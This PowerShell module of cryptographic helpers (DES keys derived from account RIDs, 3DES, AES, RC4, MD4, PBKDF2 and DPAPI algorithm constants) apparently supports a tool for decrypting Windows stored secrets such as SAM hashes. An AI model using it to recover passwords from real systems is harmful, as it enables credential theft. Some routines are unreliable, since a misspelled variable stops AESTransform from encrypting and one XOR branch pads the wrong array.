<#########################################################################################################>
<#########################################################################################################>
<#                                                                                                       #>
<# THESE FUNCTIONS ARE REQUIRED FOR SOME COMPUTING BUT NOT INTERESTING FOR UNDERSTANDING WINDOWS SECRETS #>
<#                                                                                                       #>
<#########################################################################################################>
<#########################################################################################################>

<### Common functions ###>

<#
	On older PS Version BigInteger type doesn't exist
	Implement BigInteger XOR with bytes array representation
#>
function BigIntBooleanXor($BytesA, $BytesB)
{
	If ($BytesA.Length -gt $BytesB.Length)
	{
		$Len = $BytesA.Length
		$BytesB = ((,[byte]0) * ($Len - $BytesB.Length)) + $BytesB
	}
	Else
	{
		$Len = $BytesB.Length
		$BytesB = ((,[byte]0) * ($Len - $BytesA.Length)) + $BytesB
	}

	$Bytes = @()
	For ($i = 0; $i -lt $Len; $i += 1)
	{
		$x = [UInt32]$BytesA[$i]
		$y = [UInt32]$BytesB[$i]

		$z = ($x -bxor $y)

		$Bytes += $z
	}

	If ($Bytes[$Bytes.Length-1] -eq [byte]0) { $Bytes = $Bytes[0..$($Bytes.Length-2)] }
	return $Bytes
}

<#
	Convert hex string to bytes array
#>
function HexStringToBytes($HexString)
{
	$Bytes = New-Object byte[] ($HexString.Length / 2)

	For ($i=0; $i -lt $HexString.Length; $i+=2)
	{
		$Bytes[$i/2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
	}

	return $Bytes
}

<#
	Padding with (value -band 3)
#>
function Pad($Value)
{
	If (($Value -band 3) -gt 0) { return ($Value + ($Value -band 3)) }
	Else { return $Value }
}

<#
	Remove (last byte value) to bytes array
#>
function Unpad($Bytes)
{
	$NBBytesToRemove = [Uint32]$Bytes[$Bytes.Length-1]
	return ($Bytes[0..$($Bytes.Length-$NBBytesToRemove-1)])
}

<#
	Boolean shift left/right
#>
function Shift($Value, $Num)
{
	return ([Math]::Floor($Value * [Math]::Pow(2, $Num)))
}

<#
	DES encryption/decryption : Block = 64 bits, Key = 64 bits, Mode = "CBC"
#>
function STRToKey($S)
{
	$Key = @();
	$Key += (Shift ([int]($S[0])) -1)
	$Key += ((Shift ([int]($S[0]) -band 0x01) 6) -bor (Shift ([int]($S[1])) -2))
	$Key += ((Shift ([int]($S[1]) -band 0x03) 5) -bor (Shift ([int]($S[2])) -3))
	$Key += ((Shift ([int]($S[2]) -band 0x07) 4) -bor (Shift ([int]($S[3])) -4))
	$Key += ((Shift ([int]($S[3]) -band 0x0F) 3) -bor (Shift ([int]($S[4])) -5))
	$Key += ((Shift ([int]($S[4]) -band 0x1F) 2) -bor (Shift ([int]($S[5])) -6))
	$Key += ((Shift ([int]($S[5]) -band 0x3F) 1) -bor (Shift ([int]($S[6])) -7))
	$Key += ([int]($S[6]) -band 0x7F)
	0..7 | %{
		$Key[$_] = ((Shift $Key[$_] 1) -band 0xFE)
		}

	return $Key
}

function RIDToDESKeys($SID)
{
	$Key = [BitConverter]::GetBytes($SID)
	$S1 = @()
	$S2 = @()
	$S1 += $Key[0]; $S1 += $Key[1]; $S1 += $Key[2]; $S1 += $Key[3]; $S1 += $Key[0]; $S1 += $Key[1]; $S1 += $Key[2]
	$S2 += $Key[3]; $S2 += $Key[0]; $S2 += $Key[1]; $S2 += $Key[2]; $S2 += $Key[3]; $S2 += $Key[0]; $S2 += $Key[1]

	return ((STRToKey $S1),(STRToKey $S2))
}

function DESTransform($Key, $Data, $IV, $DoEncrypt)
{
    $DES = New-Object Security.Cryptography.DESCryptoServiceProvider
    $DES.Mode = [Security.Cryptography.CipherMode]::ECB
    $DES.Padding = [Security.Cryptography.PaddingMode]::None
    $DES.Key = $Key
    $DES.IV = $IV
    $Transform = $Null
    If ($DoEncrypt) { $Transform = $DES.CreateEncryptor() }
    Else { $Transform = $DES.CreateDecryptor() }
    $Result = $Transform.TransformFinalBlock($Data, 0, $Data.Length)

    return $Result
}

<#
	Triple DES encryption/decryption : Block = 64 bits, Key = 192 bits, Mode = "ECB" or "CBC"
#>
function TripleDESTransform($Key, $Data, $IV, $Mode, $DoEncrypt)
{
    $DES = New-Object Security.Cryptography.TripleDESCryptoServiceProvider
    $DES.Mode = $Mode
    $DES.Padding = [Security.Cryptography.PaddingMode]::None
    $DES.Key = $Key
    $DES.IV = $IV
    $Transform = $Null
    If ($DoEncrypt) { $Transform = $DES.CreateEncryptor() }
    Else { $Transform = $DES.CreateDecryptor() }
    $Result = $Transform.TransformFinalBlock($Data, 0, $Data.Length)

    return $Result
}

<#
	AES encryption/decryption : Block = 128 bits, Key = 128 or 256 bits, Mode = "CBC" or "CFB"
#>
function AESTransform($Key, $Data, $IV, $Mode, $DoEncrypt)
{
    $AES = New-Object Security.Cryptography.AESCryptoServiceProvider
    $AES.Mode = $Mode
    $AES.Padding = [Security.Cryptography.PaddingMode]::Zeros
    $AES.Key = $Key
    $AES.IV = $IV
    $Transform = $Null
    If ($DoEncrpt) { $Transform = $AES.CreateEncryptor() }
    Else { $Transform = $AES.CreateDecryptor() }
    If (($Data.Length/16) -is [int])
    {
        $Result = New-Object byte[] $Data.Length
    }
    Else
    {
        $Result = New-Object byte[] (([System.Math]::Floor($Data.Length/16) * 16) + 16)
    }
    For ($i = 0; $i -lt $Data.Length; $i = $i+16)
    {
        $Block = $Data[$i..$($i+15)]
        if ($Block.Length -ne 16)
        {
            $Block = ($Block + ((,0) * (16-$Block.Length)))
        }
        $Count = $Transform.TransformBlock($Block, 0, 16, $Result, $i);
    }

    return $Result;
}

<#
	RC4 transformation : Key = 128 bits
#>
function NewRC4($Key)
{
    return New-Object Object |
    Add-Member NoteProperty Key $Key -PassThru |
    Add-Member NoteProperty S $Null -PassThru |
    Add-Member ScriptMethod init {
        if (-not $this.S)
        {
            [byte[]]$this.S = 0..255;
            0..255 | % -begin{ [long]$j=0; } {
                $j = ($j + $this.Key[$($_ % $this.Key.Length)] + $this.S[$_]) % $this.S.Length;
                $Temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $Temp;
                }
        }
    } -PassThru |
    Add-Member ScriptMethod "Transform" {
        $Data = $args[0];
        $this.init();
        $Outbuf = New-Object byte[] $($Data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($Data.Length-1) | % -begin{ $i=0;$j=0; } {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $Temp = $S2[$i]; $S2[$i] = $S2[$j]; $S2[$j] = $Temp;
            $a = $Data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $Outbuf[$_] = ($a -bxor $b);
        }

        return $Outbuf;
    } -PassThru
}

<#
	MD4 transformation
#>
function MD4Transform($bArray)
{
    $M = New-Object byte[] (([Math]::Floor($bArray.Count/64) + 1) * 64)

    $Index = 0
    ForEach ($x in $bArray) { $M[$Index] = $bArray[$Index]; $Index++}

    $M[$bArray.Count] = 0x80
    $Last = @([BitConverter]::GetBytes($bArray.Count * 8))

    $IndexLast = 0
    $IndexM = $M.Count - 8
    ForEach ($x in $Last) { $M[$IndexM] = $Last[$IndexLast]; $IndexLast++; $IndexM++}

    $A = [Convert]::ToUInt32('0x67452301', 16)
    $B = [Convert]::ToUInt32('0xefcdab89', 16)
    $C = [Convert]::ToUInt32('0x98badcfe', 16)
    $D = [Convert]::ToUInt32('0x10325476', 16)

    # Define 3 auxiliary functions
    function FF([uint32]$X, [uint32]$Y, [uint32]$Z)
    {
        (($X -band $Y) -bor ((-bnot $X) -band $Z))
    }
    function GG([uint32]$X, [uint32]$Y, [uint32]$Z)
    {
        (($X -band $Y) -bor ($X -band $Z) -bor ($Y -band $Z))
    }
    function HH([uint32]$X, [uint32]$Y, [uint32]$Z){
        ($X -bxor $Y -bxor $Z)
    }

	If (-not ([System.Management.Automation.PSTypeName]'Rotate32').Type)
	{
		Add-Type -TypeDefinition @'
		public class Rotate32
		{
			public static uint Left(uint a, int b)
			{
				return ((a << b) | (((a >> 1) & 0x7fffffff) >> (32 - b - 1)));
			}
		}
'@
	}

    # Processing message in one-word blocks
    For ($i = 0; $i -lt $M.Count; $i += 64)
    {
        # Save a copy of A/B/C/D
        $AA = $A
        $BB = $B
        $CC = $C
        $DD = $D

        # Round 1 start
        $A = [Rotate32]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0)) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0)) -band [Uint32]::MaxValue, 7)
        $C = [Rotate32]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0)) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0)) -band [Uint32]::MaxValue, 19)

        $A = [Rotate32]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0)) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0)) -band [Uint32]::MaxValue, 7)
        $C = [Rotate32]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0)) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0)) -band [Uint32]::MaxValue, 19)

        $A = [Rotate32]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0)) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0)) -band [Uint32]::MaxValue, 7)
        $C = [Rotate32]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0)) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0)) -band [Uint32]::MaxValue, 19)

        $A = [Rotate32]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0)) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0)) -band [Uint32]::MaxValue, 7)
        $C = [Rotate32]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0)) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0)) -band [Uint32]::MaxValue, 19)

        # Round 2 start
        $A = [Rotate32]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 5)
        $C = [Rotate32]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 9)
        $B = [Rotate32]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 13)

        $A = [Rotate32]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 5)
        $C = [Rotate32]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 9)
        $B = [Rotate32]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 13)

        $A = [Rotate32]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 5)
        $C = [Rotate32]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 9)
        $B = [Rotate32]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 13)

        $A = [Rotate32]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 5)
        $C = [Rotate32]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 9)
        $B = [Rotate32]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x5A827999) -band [Uint32]::MaxValue, 13)

        # Round 3 start
        $A = [Rotate32]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 9)
        $C = [Rotate32]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 15)

        $A = [Rotate32]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 9)
        $C = [Rotate32]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 15)

        $A = [Rotate32]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 9)
        $C = [Rotate32]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 15)

        $A = [Rotate32]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 3)
        $D = [Rotate32]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 9)
        $C = [Rotate32]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 11)
        $B = [Rotate32]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x6ED9EBA1) -band [Uint32]::MaxValue, 15)


        # Increment start
        $A = ([long]$A + $AA) -band [Uint32]::MaxValue
        $B = ([long]$B + $BB) -band [Uint32]::MaxValue
        $C = ([long]$C + $CC) -band [Uint32]::MaxValue
        $D = ([long]$D + $DD) -band [Uint32]::MaxValue
    }

    # Output start
    $A = ('{0:x8}' -f $A) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
    $B = ('{0:x8}' -f $B) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
    $C = ('{0:x8}' -f $C) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
    $D = ('{0:x8}' -f $D) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'

    return [byte[]]("$A$B$C$D" -replace '..', '0x$&,' -split ',' -ne '')
}

<#
	PBKDF2 HMAC SHA256
#>
function PBKDF2_HMAC_SHA256 ($Pwd, $Salt, $Length, $Iterations)
{
    # Load C# BCrypt functions
	If (-not ([System.Management.Automation.PSTypeName]'BCrypt').Type)
	{
		Add-Type -TypeDefinition @'
		using System;
		using System.Text;
		using System.Runtime.InteropServices;

		public class BCrypt
		{
			[DllImport("bcrypt.dll", CharSet = CharSet.Auto)]
			public static extern uint BCryptOpenAlgorithmProvider(ref long phAlgorithm, string pszAlgId, string pszImplementation, long dwFlags);
			[DllImport("bcrypt.dll")]
			public static extern uint BCryptCloseAlgorithmProvider(long hAlgorithm, long dwFlags);
			[DllImport("bcrypt.dll")]
			public static extern uint BCryptDeriveKeyPBKDF2(long hPrf, long pbPassword, long cbPassword, byte[] pbSalt, long cbSalt, long cIterations, byte[] pbDerivedKey, long cbDerivedKey, long dwFlags);
		}
'@
	}

    # Return Codes
    # "0xC0000000D" = "An invalid parameter was passed to a service or function (STATUS_INVALID_PARAMETER 0xC0000000D)"
    # "0xC0000008" = "An invalid HANDLE was specified (STATUS_INVALID_HANDLE 0xC0000008)"
    # "0xC0000017" = "A memory allocation failure occurred (STATUS_NO_MEMORY 0xC0000017)"
    # "0xC0000225" = "The object was not found (STATUS_NOT_FOUND 0xC0000225)"

    $Algo = [Long]0
    $Open_Flags = [Long]0x00000008  # BCRYPT_ALG_HANDLE_HMAC_FLAG

    $Res = [BCrypt]::BCryptOpenAlgorithmProvider([Ref]$Algo, "SHA256", $Null, $Open_Flags)
    If ($Res -ne 0)
    {
        $HexCode = ("{0:x8}" -f $Res).ToUpper()
        Write-Error "Failed to open algorithm provider with ID 'SHA256' : $HexCode"
        return $Null
    }

    $Key = New-Object byte[] $Length
    $PwdPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Pwd.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($Pwd, 0, $PwdPtr, $Pwd.Length)
    $Res = [BCrypt]::BCryptDeriveKeyPBKDF2($Algo, $PwdPtr, [Long]$Pwd.Length, $Salt, [Long]$Salt.Length, [Long]$Iterations, $Key, [Long]$Length, [Long]0)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($PwdPtr)
    If ($Res -ne 0)
    {
        $HexCode = ("{0:x8}" -f $Res).ToUpper()
        Write-Error "Failed to derive key : $HexCode"
        return $Null
    }

    $Res = [BCrypt]::BCryptCloseAlgorithmProvider($Algo, [Long]0)
    If ($Res -ne 0)
    {
        $HexCode = ("{0:x8}" -f $Res).ToUpper()
        Write-Error "Failed to close algorithm provider : $HexCode"
        return $Null
    }

    return [byte[]]($Key[0..31])
}

<### DPAPI Crypto constants ###>

function LoadCryptoConstants
{
	# Constants from Pypykatz DPAPI/Constants.py

	# Algorithm classes
	$Global:ALG_CLASS_ANY                   = 0
	$Global:ALG_CLASS_SIGNATURE             = [Math]::Floor(1 * [Math]::Pow(2, 13))
	$Global:ALG_CLASS_MSG_ENCRYPT           = [Math]::Floor(2 * [Math]::Pow(2, 13))
	$Global:ALG_CLASS_DATA_ENCRYPT          = [Math]::Floor(3 * [Math]::Pow(2, 13))
	$Global:ALG_CLASS_HASH                  = [Math]::Floor(4 * [Math]::Pow(2, 13))
	$Global:ALG_CLASS_KEY_EXCHANGE          = [Math]::Floor(5 * [Math]::Pow(2, 13))
	$Global:ALG_CLASS_ALL                   = [Math]::Floor(7 * [Math]::Pow(2, 13))

	# Algorithm types
	$Global:ALG_TYPE_ANY                    = 0
	$Global:ALG_TYPE_DSS                    = [Math]::Floor(1 * [Math]::Pow(2, 9))
	$Global:ALG_TYPE_RSA                    = [Math]::Floor(2 * [Math]::Pow(2, 9))
	$Global:ALG_TYPE_BLOCK                  = [Math]::Floor(3 * [Math]::Pow(2, 9))
	$Global:ALG_TYPE_STREAM                 = [Math]::Floor(4 * [Math]::Pow(2, 9))
	$Global:ALG_TYPE_DH                     = [Math]::Floor(5 * [Math]::Pow(2, 9))
	$Global:ALG_TYPE_SECURECHANNEL          = [Math]::Floor(6 * [Math]::Pow(2, 9))
	$Global:ALG_SID_ANY                     = 0
	$Global:ALG_SID_RSA_ANY                 = 0
	$Global:ALG_SID_RSA_PKCS                = 1
	$Global:ALG_SID_RSA_MSATWORK            = 2
	$Global:ALG_SID_RSA_ENTRUST             = 3
	$Global:ALG_SID_RSA_PGP                 = 4
	$Global:ALG_SID_DSS_ANY                 = 0
	$Global:ALG_SID_DSS_PKCS                = 1
	$Global:ALG_SID_DSS_DMS                 = 2
	$Global:ALG_SID_ECDSA                   = 3

	# Block Cipher sub ids
	$Global:ALG_SID_DES                     = 1
	$Global:ALG_SID_3DES                    = 3
	$Global:ALG_SID_DESX                    = 4
	$Global:ALG_SID_IDEA                    = 5
	$Global:ALG_SID_CAST                    = 6
	$Global:ALG_SID_SAFERSK64               = 7
	$Global:ALG_SID_SAFERSK128              = 8
	$Global:ALG_SID_3DES_112                = 9
	$Global:ALG_SID_CYLINK_MEK              = 12
	$Global:ALG_SID_RC5                     = 13
	$Global:ALG_SID_AES_128                 = 14
	$Global:ALG_SID_AES_192                 = 15
	$Global:ALG_SID_AES_256                 = 16
	$Global:ALG_SID_AES                     = 17
	$Global:ALG_SID_SKIPJACK                = 10
	$Global:ALG_SID_TEK                     = 11

	$Global:CRYPT_MODE_CBCI                 = 6       # ANSI CBC Interleaved
	$Global:CRYPT_MODE_CFBP                 = 7       # ANSI CFB Pipelined
	$Global:CRYPT_MODE_OFBP                 = 8       # ANSI OFB Pipelined
	$Global:CRYPT_MODE_CBCOFM               = 9       # ANSI CBC + OF Masking
	$Global:CRYPT_MODE_CBCOFMI              = 10      # ANSI CBC + OFM Interleaved

	$Global:ALG_SID_RC2                     = 2
	$Global:ALG_SID_RC4                     = 1
	$Global:ALG_SID_SEAL                    = 2

	# Diffie - Hellman sub - ids
	$Global:ALG_SID_DH_SANDF                = 1
	$Global:ALG_SID_DH_EPHEM                = 2
	$Global:ALG_SID_AGREED_KEY_ANY          = 3
	$Global:ALG_SID_KEA                     = 4
	$Global:ALG_SID_ECDH                    = 5

	# Hash sub ids
	$Global:ALG_SID_MD2                     = 1
	$Global:ALG_SID_MD4                     = 2
	$Global:ALG_SID_MD5                     = 3
	$Global:ALG_SID_SHA                     = 4
	$Global:ALG_SID_SHA1                    = 4
	$Global:ALG_SID_MAC                     = 5
	$Global:ALG_SID_RIPEMD                  = 6
	$Global:ALG_SID_RIPEMD160               = 7
	$Global:ALG_SID_SSL3SHAMD5              = 8
	$Global:ALG_SID_HMAC                    = 9
	$Global:ALG_SID_TLS1PRF                 = 10
	$Global:ALG_SID_HASH_REPLACE_OWF        = 11
	$Global:ALG_SID_SHA_256                 = 12
	$Global:ALG_SID_SHA_384                 = 13
	$Global:ALG_SID_SHA_512                 = 14

	# Secure Channel sub ids
	$Global:ALG_SID_SSL3_MASTER             = 1
	$Global:ALG_SID_SCHANNEL_MASTER_HASH    = 2
	$Global:ALG_SID_SCHANNEL_MAC_KEY        = 3
	$Global:ALG_SID_PCT1_MASTER             = 4
	$Global:ALG_SID_SSL2_MASTER             = 5
	$Global:ALG_SID_TLS1_MASTER             = 6
	$Global:ALG_SID_SCHANNEL_ENC_KEY        = 7
	$Global:ALG_SID_ECMQV                   = 1

	$Global:ALGORITHMS = @{}
	$Global:ALGORITHMS["CALG_MD2"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_MD2)
	$Global:ALGORITHMS["CALG_MD4"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_MD4)
	$Global:ALGORITHMS["CALG_MD5"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_MD5)
	$Global:ALGORITHMS["CALG_SHA"] = [Uint64]($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_SHA)
	$Global:ALGORITHMS["CALG_SHA1"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_SHA1)
	$Global:ALGORITHMS["CALG_RSA_SIGN"] = ($Global:ALG_CLASS_SIGNATURE -bor $Global:ALG_TYPE_RSA -bor $Global:ALG_SID_RSA_ANY)
	$Global:ALGORITHMS["CALG_DSS_SIGN"] = ($Global:ALG_CLASS_SIGNATURE -bor $Global:ALG_TYPE_DSS -bor $Global:ALG_SID_DSS_ANY)
	$Global:ALGORITHMS["CALG_NO_SIGN"] = ($Global:ALG_CLASS_SIGNATURE -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_ANY)
	$Global:ALGORITHMS["CALG_RSA_KEYX"] = ($Global:ALG_CLASS_KEY_EXCHANGE -bor $Global:ALG_TYPE_RSA -bor $Global:ALG_SID_RSA_ANY)
	$Global:ALGORITHMS["CALG_DES"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_DES)
	$Global:ALGORITHMS["CALG_3DES_112"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_3DES_112)
	$Global:ALGORITHMS["CALG_3DES"] = [Uint64]($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_3DES)
	$Global:ALGORITHMS["CALG_DESX"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_DESX)
	$Global:ALGORITHMS["CALG_RC2"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_RC2)
	$Global:ALGORITHMS["CALG_RC4"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_STREAM -bor $Global:ALG_SID_RC4)
	$Global:ALGORITHMS["CALG_SEAL"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_STREAM -bor $Global:ALG_SID_SEAL)
	$Global:ALGORITHMS["CALG_DH_SF"] = ($Global:ALG_CLASS_KEY_EXCHANGE -bor $Global:ALG_TYPE_DH -bor $Global:ALG_SID_DH_SANDF)
	$Global:ALGORITHMS["CALG_DH_EPHEM"] = ($Global:ALG_CLASS_KEY_EXCHANGE-bor$Global:ALG_TYPE_DH -bor $Global:ALG_SID_DH_EPHEM)
	$Global:ALGORITHMS["CALG_AGREEDKEY_ANY"] = ($Global:ALG_CLASS_KEY_EXCHANGE -bor $Global:ALG_TYPE_DH -bor $Global:ALG_SID_AGREED_KEY_ANY)
	$Global:ALGORITHMS["CALG_KEA_KEYX"] = ($Global:ALG_CLASS_KEY_EXCHANGE -bor $Global:ALG_TYPE_DH-bor$Global:ALG_SID_KEA)
	$Global:ALGORITHMS["CALG_HUGHES_MD5"] = ($Global:ALG_CLASS_KEY_EXCHANGE -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_MD5)
	$Global:ALGORITHMS["CALG_SKIPJACK"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_SKIPJACK)
	$Global:ALGORITHMS["CALG_TEK"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_TEK)
